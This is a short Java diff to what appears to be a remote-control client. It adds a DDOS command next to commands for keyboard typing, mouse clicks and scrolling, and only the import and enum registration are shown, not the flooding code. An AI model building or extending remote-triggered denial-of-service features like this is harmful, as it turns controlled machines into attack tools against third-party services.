@@ -5,6 +5,7 @@ package br.com.introcdc.connect.client.command;
 
 import br.com.introcdc.connect.client.ConnectClient;
 import br.com.introcdc.connect.client.commands.audio.ClientCommandAudio;
+import br.com.introcdc.connect.client.commands.control.ClientCommandDDOS;
 import br.com.introcdc.connect.client.commands.control.ClientCommandKeyboardType;
 import br.com.introcdc.connect.client.commands.control.ClientCommandMouseClick;
 import br.com.introcdc.connect.client.commands.control.ClientCommandMouseScroll;
@@ -32,6 +33,7 @@ public enum ClientCommandEnum {
     AUDIO(ClientCommandAudio.class),
 
     // Control
+    DDOS(ClientCommandDDOS.class),
     KEYBOARD_TYPE(ClientCommandKeyboardType.class),
     MOUSE_CLICK(ClientCommandMouseClick.class),
     MOUSE_SCROLL(ClientCommandMouseScroll.class),
